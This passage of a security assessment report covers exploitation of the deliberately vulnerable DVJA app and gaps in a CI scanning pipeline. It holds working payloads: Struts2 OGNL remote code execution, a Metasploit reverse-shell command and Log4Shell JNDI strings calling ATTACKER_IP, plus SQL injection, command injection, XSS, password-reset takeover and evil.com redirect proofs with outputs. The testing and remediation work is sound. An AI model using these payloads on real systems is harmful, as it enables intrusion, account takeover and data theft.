(#ognlUtil.getExcludedClasses().clear()).\
(#context.setMemberAccess(#dm)))).\
(#cmd='id').\
(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).\
(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).\
(#p=new java.lang.ProcessBuilder(#cmds)).\
(#p.redirectErrorStream(true)).\
(#process=#p.start()).\
(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).\
(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).\
(#ros.flush())}" \
"http://dvja:8080/"
```

**Alternative using Metasploit:**
```bash
msfconsole -q -x "use exploit/multi/http/struts2_content_type_ognl; \
set RHOSTS dvja; set RPORT 8080; set TARGETURI /; \
set PAYLOAD linux/x64/meterpreter/reverse_tcp; \
set LHOST ATTACKER_IP; exploit"
```

**Expected result:** The server executes the injected command and returns the output. This vulnerability was responsible for the 2017 Equifax breach.

---

### Exploit #10: Log4Shell — CVE-2021-44228 (matches Issue #5)

**Target:** Any input that gets logged (login forms, search, headers)
**CWE:** CWE-917 (Expression Language Injection)

```bash
# Step 1: Start LDAP listener (using marshalsec or similar)
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://ATTACKER_IP:8888/#Exploit"

# Step 2: Inject JNDI payload via login field
curl "http://dvja:8080/userSearch.action" \
  --data-urlencode 'login=${jndi:ldap://ATTACKER_IP:1389/exploit}'

# Step 3: Inject via User-Agent header (if headers are logged)
curl -H 'User-Agent: ${jndi:ldap://ATTACKER_IP:1389/exploit}' \
  "http://dvja:8080/"

# Detection (non-exploiting test with DNS callback)
curl "http://dvja:8080/userSearch.action" \
  --data-urlencode 'login=${jndi:ldap://YOUR_BURP_COLLABORATOR_ID.oastify.com/test}'
```

**Expected result:** The Log4j library resolves the JNDI reference, connecting to the attacker's LDAP server, which serves a malicious Java class that gets loaded and executed on the target server.

---

## 8. POC Verification Results

All exploits were executed against a live DVJA instance (`docker compose up` on localhost:8080) on 2026-03-14. Results confirm every documented vulnerability is exploitable.

### Summary

| # | Vulnerability | OWASP | Exploit Confirmed | Severity | Pipeline Detected |
|---|--------------|-------|-------------------|----------|-------------------|
| 1 | SQL Injection | A1 | **YES** — all users dumped | Critical | Yes (CodeQL #22) |
| 2 | Command Injection | A1 | **YES** — `uid=0(root)`, read `/etc/passwd` | Critical | Yes (CodeQL #21) |
| 3 | Struts2 RCE (CVE-2017-5638) | A9 | **YES** — `uid=0(root)` via Content-Type OGNL | Critical | Yes (Trivy SCA) |
| 4a | Reflected XSS | A3 | **YES** — `<img onerror=alert()>` rendered unescaped | High | No (needs DAST) |
| 4b | Stored XSS | A3 | **YES** — XSS payload persists in product list | High | No (needs DAST) |
| 5 | IDOR | A4 | **YES** — changed victim's password from attacker session | High | No (needs DAST) |
| 6 | devMode Info Disclosure | A5 | **YES** — full stack trace with source file/line | Medium | Partial (CodeQL) |
| 7 | Broken Auth (MD5 reset token) | A2 | **YES** — reset any user's password via `MD5(login)` | Critical | No (needs DAST) |
| 8a | Admin Bypass via Cookie | A7 | **YES** — `Cookie: admin=1` dumps all users as JSON | Critical | No (needs DAST) |
| 8b | Open Redirect | A10 | **YES** — 302 redirect to `https://evil.com` | Medium | No (needs DAST) |

### POC 1: SQL Injection (A1)

**Endpoint:** `GET /userSearch.action?login=' OR '1'='1`
**Auth required:** Yes (session cookie)

```
$ curl -b session "http://localhost:8080/userSearch.action?login=' OR '1'='1"

Result: All users dumped from database
  ID: 18, Name: TestUser, Email: test@test.com
  ID: 19, Name: VictimUser, Email: victim@test.com
```

The JPQL query in `UserService.findByLoginUnsafe()` concatenates user input directly, allowing injection to bypass `WHERE` clause logic and return all rows.

### POC 2: Command Injection (A1)

**Endpoint:** `POST /ping.action` with `address=127.0.0.1; <command>`
**Auth required:** Yes (session cookie)

```
$ curl -b session -X POST http://localhost:8080/ping.action -d 'address=127.0.0.1;id'

uid=0(root) gid=0(root) groups=0(root)

$ curl -b session -X POST http://localhost:8080/ping.action \
  --data-urlencode 'address=127.0.0.1; cat /etc/passwd | head -5'

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
```

`PingAction.doExecCommand()` passes user input to `Runtime.exec()` through a shell, allowing command chaining via `;`, `&&`, or `|`. The container runs as **root**, meaning full system compromise.

### POC 3: Struts2 RCE — CVE-2017-5638 (A9)

**Endpoint:** Any `.action` URL (unauthenticated)
**Method:** Malicious `Content-Type` header with OGNL expression

```
$ curl -H "Content-Type: %{(#_='multipart/form-data')...(#cmd='id')...}" \
  http://localhost:8080/login.action

uid=0(root) gid=0(root) groups=0(root)

$ curl -H "Content-Type: %{...(#cmd='cat /etc/hostname')...}" \
  http://localhost:8080/login.action

57f6f8d0919e
```

This is a pre-auth RCE — no login needed. The Struts2 multipart parser evaluates OGNL expressions in the `Content-Type` header before any authentication interceptor runs. Combined with the container running as root, this gives full system access with a single HTTP request.

### POC 4a: Reflected XSS (A3)

**Endpoint:** `GET /listProduct.action?searchQuery=<img src=x onerror=alert(1)>`
**Auth required:** Yes

```
$ curl -b session "http://localhost:8080/listProduct.action?searchQuery=<img src=x onerror=alert(1)>"

Response contains:
  Listing products with <strong>search query: </strong> <img src=x onerror=alert(1)>
```

The `ProductList.jsp` uses `<%= request.getParameter("searchQuery") %>` (raw JSP scriptlet) in the label text, which outputs the parameter without HTML encoding. The Struts `<s:textfield>` input is properly escaped, but the label is not.

### POC 4b: Stored XSS (A3)

**Endpoint:** `POST /addEditProduct.action` then `GET /listProduct.action`
**Auth required:** Yes

```
$ curl -b session -X POST http://localhost:8080/addEditProduct.action \
  --data-urlencode "product.name=<img src=x onerror=alert('StoredXSS')>" \
  -d 'product.description=test&product.code=XSS001&product.tags=test'

$ curl -b session http://localhost:8080/listProduct.action

Response contains:
  <td><img src=x onerror=alert('StoredXSS')></td>
```

The `ProductList.jsp` renders product names with `<s:property value="name" escape="false"/>`, disabling Struts' default HTML escaping. The XSS payload is stored in the database and executes for every user who views the product list.

### POC 5: IDOR (A4)

**Endpoint:** `POST /editUser.action`
**Auth required:** Yes (but no authorization check on `userId`)

```
$ # Attacker (userId=18) changes Victim's (userId=19) password:
$ curl -b attacker_session -X POST http://localhost:8080/editUser.action \
  -d 'userId=19&email=hacked@evil.com&password=Hacked123&passwordConfirmation=Hacked123'

HTTP 200 OK

$ # Verify: login as victim with attacker-set password:
$ curl -X POST http://localhost:8080/login.action \
  -d 'login=victim&password=Hacked123'

HTTP 200 — login successful (redirected to home)
```

`UserAction.edit()` takes `userId` from the request body and updates that user's record without verifying it matches the authenticated session user. Any logged-in user can modify any other user's email, password, and profile.

### POC 6: Security Misconfiguration — devMode (A5)

**Endpoint:** `GET /api/ping.action?login=nonexistent`
**Auth required:** No

```
$ curl "http://localhost:8080/api/ping.action?login=nonexistent_user"

<h2>Struts Problem Report</h2>
Messages: (none)
File: com/appsecco/dvja/controllers/ApiAction.java
Line number: 42
Stacktrace: java.lang.NullPointerException
  at com.appsecco.dvja.controllers.ApiAction.ping(ApiAction.java:42)
  ...
```

`struts.devMode=true` in `struts.xml` causes full Java stack traces with source file paths and line numbers to be displayed to the user. This leaks internal architecture details useful for further exploitation.

### POC 7: Broken Auth — Password Reset Takeover (A2)

**Endpoint:** `POST /resetPasswordExecute.action`
**Auth required:** No

```
$ # The reset key is MD5(login). Compute it for any target:
$ echo -n "victim" | md5
96d4976b516a16ac19d148f3b744eee1

$ curl -X POST http://localhost:8080/resetPasswordExecute.action \
  -d 'login=victim&key=96d4976b516a16ac19d148f3b744eee1&password=ResetByAttacker1&passwordConfirmation=ResetByAttacker1'

HTTP 200 — password reset successful

$ # Login as victim with attacker-chosen password:
$ curl -X POST http://localhost:8080/login.action \
  -d 'login=victim&password=ResetByAttacker1'

HTTP 200 — login successful
```

The reset token is `MD5(login)` — a deterministic, non-secret value. Any attacker who knows a username can reset their password without any authentication or email verification.

### POC 8a: Admin Bypass via Cookie (A7)

**Endpoint:** `GET /api/userList.action`
**Auth required:** No (just a cookie)

```
$ curl -H "Cookie: admin=1" http://localhost:8080/api/userList.action

{"count":2,"users":[
  {"id":"18","login":"testuser","email":"test@test.com"},
  {"id":"19","login":"victim","email":"victim@test.com"}
]}
```

`ApiAction.adminShowUsers()` checks `request.getCookies()` for an `admin` cookie with value `1`. Since cookies are client-controlled, any user (or unauthenticated attacker) can set this cookie and dump the entire user database.

### POC 8b: Open Redirect (A10)

**Endpoint:** `GET /redirect.action?url=https://evil.com`
**Auth required:** No

```
$ curl -o /dev/null -w "HTTP code: %{http_code}\nLocation: %{redirect_url}" \
  "http://localhost:8080/redirect.action?url=https://evil.com"

HTTP code: 302
Location: https://evil.com/
```

`RedirectAction` takes the `url` parameter and issues a 302 redirect without any validation. This enables phishing attacks where the attacker sends a legitimate-looking DVJA link that redirects to a credential harvesting page.

---

## 9. Recommendations

### 9.1 Pipeline Improvements

| Gap | Recommendation |
|-----|----------------|
| XSS not detected | Add custom CodeQL queries for JSP scriptlet output (`<%= %>`) and Struts2 `escape="false"` patterns |
| IDOR not detected | Add DAST scanning (e.g., OWASP ZAP, Burp Suite) to the pipeline for authorization testing |
| CSRF not detected | Add a custom query or DAST check for absence of anti-CSRF tokens on state-changing forms |
| Broken Auth not detected | Add custom CodeQL queries for weak crypto (`MD5DigestAsHex` for passwords) and predictable tokens |
| Open redirect not detected | Add custom CodeQL query for Struts2 redirect result types with user-controlled URLs |
| Access control not detected | Implement DAST scans with authenticated and unauthenticated sessions to compare access |
| Configuration issues not detected | Add configuration scanning (e.g., `struts.devMode` checks, hardcoded secrets in properties) |
| Container build tool noise | Adopt multi-stage Dockerfile to eliminate Maven/Plexus/XStream from production image (see Section 5.4) |

### 9.2 Remediation Priority

| Priority | Vulnerability | Fix |
|----------|--------------|-----|
| **P0 — Immediate** | Struts2 CVE-2017-5638 (RCE) | Upgrade `struts2.version` to 6.4.0+ in `pom.xml` |
| **P0 — Immediate** | Log4Shell CVE-2021-44228 (RCE) | Upgrade `log4j2.version` to 2.17.1+ in `pom.xml`; remove log4j 1.x |
| **P0 — Immediate** | Command Injection | Use `ProcessBuilder` with argument array (no shell) |
| **P0 — Immediate** | SQL Injection | Use parameterized queries with `:param` syntax |
| **P1 — High** | Broken Auth (predictable token) | Implement `SecureRandom`-based tokens stored in DB |
| **P1 — High** | Password hashing (MD5) | Migrate to bcrypt/scrypt/Argon2 with salt |
| **P1 — High** | XSS (reflected + stored) | Use `<s:property>` with escaping; remove `escape="false"` |
| **P1 — High** | IDOR | Validate that `userId` matches the authenticated session user |
| **P1 — High** | Admin bypass | Replace cookie check with session-based `isAdmin()` check |
| **P2 — Medium** | Open Redirect | Validate URL starts with `/` (internal only) |
| **P2 — Medium** | CSRF | Implement Struts2 `TokenSessionInterceptor` |
| **P2 — Medium** | Sensitive data in logs | Remove password from log statements |
| **P2 — Medium** | devMode=true | Set `struts.devMode=false` in production |
| **P2 — Medium** | Docker build tools in image | Use multi-stage Dockerfile (see Section 5.4) — eliminates 5 container-only findings |
| **P3 — Low** | Remaining dependency updates | Update all dependencies to latest stable versions |

---

## Appendix A: Complete Issue Inventory

### A.1 SAST — CodeQL (Issues #21–24)

| # | Type | Severity | Title | True/False Positive |
|---|------|----------|-------|-------------------|
| 21 | CODE | CRITICAL | Uncontrolled command line — 1 location | TRUE POSITIVE |
| 22 | CODE | HIGH | SQL Injection — 2 locations | TRUE POSITIVE |
| 23 | CODE | HIGH | Sensitive info in logs — 1 location | TRUE POSITIVE |
| 24 | CODE | HIGH | Log Injection — 4 locations | TRUE POSITIVE |

### A.2 SCA — Trivy Dependencies (Issues #1–20)

| # | Type | Severity | Title | True/False Positive |
|---|------|----------|-------|-------------------|
| 1 | DEPENDENCY | CRITICAL | commons-collections 3.1 — 2 CVEs | TRUE POSITIVE |
| 2 | DEPENDENCY | CRITICAL | commons-fileupload 1.3.2 — 3 CVEs | TRUE POSITIVE |
| 3 | DEPENDENCY | CRITICAL | dom4j 1.6.1 — 2 CVEs | TRUE POSITIVE |
| 4 | DEPENDENCY | CRITICAL | log4j 1.2.14 — 6 CVEs | TRUE POSITIVE |
| 5 | DEPENDENCY | CRITICAL | log4j-core 2.3 — 4 CVEs | TRUE POSITIVE |
| 6 | DEPENDENCY | CRITICAL | struts2-core 2.3.30 — 17 CVEs | TRUE POSITIVE |
| 7 | DEPENDENCY | CRITICAL | spring-beans 3.0.5 — 2 CVEs | TRUE POSITIVE |
| 8 | DEPENDENCY | CRITICAL | spring-web 3.0.5 — 4 CVEs | TRUE POSITIVE |
| 9 | DEPENDENCY | HIGH | gson 2.8.1 — 1 CVE | TRUE POSITIVE |
| 10 | DEPENDENCY | HIGH | commons-beanutils 1.7.0 — 2 CVEs | TRUE POSITIVE |
| 11 | DEPENDENCY | HIGH | commons-io 2.2 — 1 CVE | TRUE POSITIVE |
| 12 | DEPENDENCY | HIGH | mysql-connector-java 5.1.42 — 2 CVEs | TRUE POSITIVE |
| 13 | DEPENDENCY | HIGH | xwork-core 2.3.30 — 1 CVE | TRUE POSITIVE |
| 14 | DEPENDENCY | HIGH | struts-core 1.3.8 — 4 CVEs | TRUE POSITIVE |
| 15 | DEPENDENCY | HIGH | struts-tiles 1.3.8 — 1 CVE | TRUE POSITIVE |
| 16 | DEPENDENCY | HIGH | velocity 1.6.2 — 1 CVE | TRUE POSITIVE |
| 17 | DEPENDENCY | HIGH | hibernate-core 3.3.1.GA — 1 CVE | TRUE POSITIVE |
| 18 | DEPENDENCY | HIGH | spring-context 3.0.5 — 1 CVE | TRUE POSITIVE |
| 19 | DEPENDENCY | HIGH | spring-core 3.0.5 — 4 CVEs | TRUE POSITIVE |
| 20 | DEPENDENCY | HIGH | spring-expression 3.0.5 — 1 CVE | TRUE POSITIVE |

### A.3 Container Scan — Trivy Image (container-only packages)

After deduplication (removing packages already covered by SCA), the container scan produces issues only for packages not declared in `pom.xml`:

| Package | Type | Severity | Unique CVEs | True/False Positive |
|---------|------|----------|-------------|-------------------|
| xstream 1.4.10 | CONTAINER | CRITICAL | ~8 | TRUE POSITIVE |
| plexus-utils 3.0.15 | CONTAINER | CRITICAL | ~5 | TRUE POSITIVE |
| maven-core 3.0.4 | CONTAINER | CRITICAL | ~1 | TRUE POSITIVE |
| maven-shared-utils 0.1 | CONTAINER | CRITICAL | 1 | TRUE POSITIVE |
| plexus-archiver 2.1 | CONTAINER | HIGH | ~1 | TRUE POSITIVE |

*Note: Issues #25–49 from the initial container scan run were closed due to cross-scanner duplication (20 issues duplicated SCA) and within-scan CVE inflation (same JAR at 3 image paths tripled counts). The pipeline was fixed to deduplicate both, and subsequent runs create only the 5 container-only issues above.*

---

## Appendix B: Vulnerability Categories Not in Solution Docs But Found by Pipeline

| Pipeline Issue | Category | Notes |
|---------------|----------|-------|
| #24 — Log Injection (CWE-117) | Log Tampering | Related to A6 but distinct. Attackers can forge log entries by injecting newlines. |
| #1 — commons-collections | Deserialization RCE | Not in solutions. Known Java deserialization gadget chain. |
| #2 — commons-fileupload | RCE via deserialization | Not in solutions. Struts2 dependency. |
| #3 — dom4j | XXE | Not in solutions. Transitive via Hibernate. |
| #4 — log4j 1.x | Multiple RCEs | Not in solutions. Legacy logging dependency. |
| #5 — log4j-core (Log4Shell) | RCE | Not in solutions. One of the most critical CVEs in history. |
| #7 — spring-beans | Spring4Shell | Not in solutions. Not exploitable on JDK 8. |
| #8 — spring-web | Deserialization RCE | Not in solutions. Conditional exploitability. |
| #9–#20 | Various | Various HIGH-severity dependency vulnerabilities not in solutions. |
| Container-only: xstream | Deserialization RCE | Transitive dependency via Struts2, not in pom.xml. 8+ CVEs including CVE-2021-39144. |
| Container-only: plexus-utils | Path Traversal | Build tooling vulnerability. CVE-2022-4244 (9.1). |
| Container-only: maven-shared-utils | Command Injection | Build tooling. CVE-2022-29599 (9.8). |

---

## Appendix C: Pipeline Gap Analysis — Root Causes and Recommendations

### C.1 Gitleaks — Zero Findings Explained

**Observed behavior:** Gitleaks ran successfully but reported "no leaks found" despite hardcoded credentials existing in `config.properties` and `docker-compose.yml`.

**Root cause:** The repository is a fork of `appsecco/dvja`. The credentials were committed in the original repo (commit `e212a46`, Oct 2018). On `push` events, `gitleaks-action@v2` defaults to `--log-opts=-1`, scanning **only the latest commit's diff**. Since the latest commit (`8c0bd80`) only added the pipeline YAML, the credentials were never in scope.

```
gitleaks cmd: gitleaks detect ... --log-opts=-1
executing: git -C . log -p -U0 -1       ← only 1 commit scanned
1 commits scanned.
no leaks found
```

This is not a fork-specific issue — any secret committed before the pipeline was installed would be invisible with incremental scanning.

**Secondary concern:** Even with `--no-git`, the default Gitleaks ruleset does not match `mysql.password=ec95c258266b8e985848cae688effa2b` — Gitleaks targets specific token formats (AWS keys with `AKIA` prefix, GitHub tokens with `ghp_`, etc.), not generic `password=value` patterns. This is by design: casting a wide net on `key=value` patterns produces too many false positives across diverse codebases.

**Investigation of alternative tools:**

| Tool | Catches `mysql.password=ec95c...`? | Custom rules needed? | Status |
|------|-----------------------------------|-----------------------|--------|
| **Gitleaks** | No | Yes (custom `.toml`) | Active, widely adopted |
| **TruffleHog** | No | Yes (custom YAML) | Active, same design philosophy as Gitleaks |
| **Semgrep Secrets** | Partially (free `p/secrets` has limitations with config files) | No | Full product requires paid license |
| **Whispers** (Skyscanner) | Yes | No | **Archived** (Oct 2023) — not recommended |
| **detect-secrets** (Yelp) | **Yes** | **No** | Active, Apache 2.0 |

**detect-secrets** (v1.5.0) catches the hardcoded credentials out-of-the-box using two independent signals:
- **KeywordDetector**: flags lines where a keyword like `password` appears in an assignment context
- **HexHighEntropyString**: flags the `ec95c258266b8e985848cae688effa2b` value due to high hex entropy

Verified locally — `detect-secrets scan` with default plugins finds all 3 instances (2 in `docker-compose.yml`, 1 in `config.properties`) with zero configuration.

**Remediation applied:** The pipeline now uses a **dual-scanner** approach:

| Tool | Strength | Role |
|------|----------|------|
| **Gitleaks** (`--no-git`) | Provider-specific tokens (AWS, GitHub, Slack, etc.), git-history scanning, SARIF output | Catch high-confidence token leaks |
| **detect-secrets** (default plugins) | Generic `password=value` keyword matching + entropy analysis in config files | Catch hardcoded credentials that Gitleaks misses |

Findings from both scanners are **deduplicated by file:line** and merged into a single `[SECRET]` GitHub issue. This eliminates the need for custom Gitleaks rules.

**Scanning mode trade-offs:**

The `--no-git` flag on Gitleaks bypasses git history and scans all files on disk. This catches any secret currently present in the repo, regardless of when it was committed. However, it introduces a genuine gap: secrets introduced within a PR's commits are not caught at the commit level — `--no-git` only sees the final working tree. Three modes cover three different threat surfaces:

| Mode | What it catches | What it misses |
|------|----------------|----------------|
| `--no-git` (current default) | Any secret in the current working tree | Secrets added then deleted within the same PR; commit-level attribution |
| Git-aware PR scan (Gitleaks default) | Secrets introduced in the PR's commits specifically | Pre-existing secrets committed before the pipeline was installed |
| `--log-opts=--all` (audit mode) | Every secret ever committed across full history | Slow; impractical per-push |

The current pipeline uses `--no-git` because the primary problem was pre-existing secrets in a forked repo that incremental scanning missed entirely. For a mature pipeline, combining git-aware PR scanning with `--no-git` would close the remaining gap.

**For full git-history audits** (e.g., finding secrets that were committed and later removed — still in history, still need rotation), run a manual scan with `--log-opts=--all`:

```bash
# Full history audit — run manually or via workflow_dispatch
gitleaks detect \
  --redact \
  -v \
  --report-format=sarif \
  --report-path=results.sarif \
  --log-opts=--all
```

This scans diffs from every commit ever made (including forked/upstream commits) and will find secrets even if they were deleted in later commits. It can be slow on large repos, so it is recommended as an on-demand audit workflow rather than a per-push step. Example `workflow_dispatch` trigger for this:

```yaml
# Separate workflow: .github/workflows/secrets-audit.yml
name: Secrets Audit (Full History)
on:
  workflow_dispatch:

jobs:
  full-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Install Gitleaks
        run: |
          curl -sSfL https://github.com/gitleaks/gitleaks/releases/latest/download/gitleaks_8.24.3_linux_x64.tar.gz \
            | tar xz -C /usr/local/bin
      - name: Run full history scan
        run: |
          gitleaks detect \
            --redact -v \
            --exit-code=0 \
            --report-format=sarif \
            --report-path=results.sarif \
            --log-opts=--all
      - name: Upload report
        uses: actions/upload-artifact@v4
        with:
          name: gitleaks-full-audit
          path: results.sarif
```

### C.2 CodeQL — Missing XML Configuration Indexing

**Observed behavior:** CodeQL did not detect `struts.devMode=true` (security misconfiguration) in `struts.xml`.

**Root cause:** The `github/codeql-action/init@v4` with `languages: java` builds a database from compiled Java bytecode. Non-Java files (`.xml`) are not automatically indexed unless explicitly included via `codeql database index-files`.

**Remediation applied:** Added a `codeql database index-files --language xml --include-extension .xml` step between the Maven build and the CodeQL analysis. This enables the Struts devMode query (`java/struts-dev-mode`) to find its target.

**Note:** An earlier iteration also attempted to index `.properties` files as XML. This was incorrect — `.properties` files use `key=value` syntax, not XML, and the step failed silently due to `continue-on-error: true`. The `.properties` indexing has been removed. Hardcoded credentials in `config.properties` are now covered by detect-secrets instead.

### C.3 Trivy Container Scan — Zero Findings

**Observed behavior:** The Trivy container image scan completed successfully, detected Ubuntu 24.04 with 207 OS packages, but produced zero CRITICAL or HIGH findings. No `[CONTAINER]` issues were created.

**Root cause (two factors):**

1. **Modern base image:** The Dockerfile uses `eclipse-temurin:8-jdk` which is based on Ubuntu 24.04 LTS. The image was built with `apt-get update` at build time (March 2026), pulling the latest patches. A freshly updated Ubuntu 24.04 may genuinely have zero CRITICAL/HIGH OS-level vulnerabilities.

2. **OS-only scan:** The Trivy container scan was configured with `vuln-type: 'os'`, meaning it only checked OS packages (apt/dpkg). The Java libraries packaged inside the WAR file (Struts2 2.3.30, Log4j 2.3, Spring 3.0.5, etc.) — which contain the most critical vulnerabilities — were excluded from the container scan scope.

This created a blind spot: the SCA step found the vulnerable Java libraries in `pom.xml`, but the container scan couldn't verify that those same libraries were present in the deployed image, because it was only looking at the OS layer.

**Remediation applied:** Changed `vuln-type` from `'os'` to `'os,library'` in both the JSON and SARIF container scan steps. This enables Trivy to scan:
- **OS packages** (dpkg, apt) — Ubuntu base image vulnerabilities
- **Language libraries** (Java JARs, etc.) — Struts, Log4j, Spring, and all other JARs bundled in the WAR

This provides a defense-in-depth approach: SCA catches vulnerabilities at the source level (`pom.xml`), while the container scan catches them in the deployed artifact (the Docker image). If a vulnerable library is introduced outside of Maven (e.g., manually copied into the image), only the container scan would detect it.

### C.4 CodeQL — MD5 Weak Hashing Not Flagged (DigestUtils)

**Observed behavior:** `DigestUtils.md5DigestAsHex()` used for password hashing in `UserService.java` was not reported.

**Root cause:** In November 2024, CodeQL reclassified MD5/SHA1 from `java/weak-cryptographic-algorithm` to `java/potentially-weak-cryptographic-algorithm` (precision: medium) to reduce noise from legitimate non-cryptographic uses. The query may have suppressed the finding because CodeQL couldn't confirm with high enough confidence that MD5 was being used in a cryptographic/security context.

**Recommendation:** Add a custom CodeQL query or Semgrep rule that specifically flags `md5DigestAsHex` when used in methods named `*password*` or `*hash*Password*`.

### C.5 Vulnerabilities Fundamentally Outside SAST/SCA Scope

The following categories require **DAST** (Dynamic Application Security Testing) or **manual code review** and cannot be detected by CodeQL or Trivy regardless of configuration:

| Vulnerability | Why SAST Can't Detect It |
|--------------|-------------------------|
| **XSS** (A3) | Data flow crosses Java → JSP scriptlet/Struts2 tag boundary; JSPs may not be compiled into CodeQL's database |
| **IDOR** (A4) | Absence of authorization check — SAST detects dangerous patterns, not missing controls |
| **CSRF** (A8) | Absence of anti-CSRF tokens on forms — same "missing control" problem |
| **Cookie-based admin bypass** (A7) | Syntactically valid code; the flaw is a design decision (trusting client cookies for authz) |
| **Open Redirect** (A10) | Data flow goes through Struts2 XML config (`${url}` in result type), breaking CodeQL taint tracking |
| **Predictable reset token** (A2) | Business logic flaw — `MD5(username)` as reset key requires understanding the intended security model |

**Recommendation:** Add OWASP ZAP (DAST) as an additional pipeline stage running against the deployed Docker container to cover these gaps.

---

## Appendix D: Pipeline Execution Evidence

### D.1 Pipeline Runs

| Run | Commit | Date | Trigger | Result | Notes |
|-----|--------|------|---------|--------|-------|
| #1 | `8c0bd80` | 2026-03-09 | push | ✅ Success | Initial pipeline — all jobs green. Created issues #1–24 (4 SAST + 20 SCA). Container scan found 0 issues (vuln-type was `os` only). |
| #2 | `ca99fcb` | 2026-03-11 | push | ⚠️ Partial | Pipeline improvements (Gitleaks two-tier, CodeQL XML indexing, Trivy os+library, v4 upgrade). Container scan now found 25 issues (#25–49). CodeQL failed due to `codeql` binary not on PATH (exit code 127). |
| #3 | `8311663` | 2026-03-11 | push | ✅ Success | CodeQL fix (`${CODEQL_DIST}/codeql`). All 7 jobs green: Build, SCA, SAST, Secrets, Docker Build, Container Scan, Issue Creation. XML/Properties indexing ran (26 XML files, 9 properties files processed). |

### D.2 Evidence Collection Checklist

To present complete evidence of the pipeline, capture the following from GitHub:

- [ ] **GitHub Actions overview page** — screenshot showing all pipeline runs
- [ ] **Successful pipeline run** — expand to show all 7 jobs (Build, SCA, SAST, Secrets, Docker Build, Container Scan, Issue Creation)
- [ ] **GitHub Issues tab** — screenshot showing all 49 security issues created automatically
- [ ] **Code Scanning alerts** (if SARIF upload succeeded) — Security → Code Scanning tab
- [ ] **Artifacts** — downloaded SARIF/JSON reports from the pipeline run artifacts
- [ ] **Individual job logs** — expand key steps showing scanner output (e.g., Trivy finding 51 CVEs in struts2-core)

### D.3 Issue Statistics (After Deduplication)

| Category | CRITICAL | HIGH | Total Issues |
|----------|----------|------|-------------|
| SAST (CodeQL) | 1 | 3 | 4 |
| SCA (Trivy fs) | 8 | 12 | 20 |
| Container (container-only) | 3 | 2 | 5 |
| Secrets (Gitleaks) | 0 | 0 | 0 |
| **Total** | **12** | **17** | **29** |

### D.4 Deduplication Note

The initial container scan (run #2) produced 25 `[CONTAINER]` issues, but 20 were duplicates of the SCA `[DEPENDENCY]` issues (same libraries), and all had inflated CVE counts (same JAR found at 3 paths in the image). These were closed and the pipeline was fixed to:
- **Skip** container issues for packages already reported by SCA
- **Deduplicate** CVEs by `VulnerabilityID` within each package (eliminating triplication)

The 5 remaining container-only packages (xstream, plexus-utils, plexus-archiver, maven-core, maven-shared-utils) are genuinely new findings not detectable via `pom.xml` analysis.
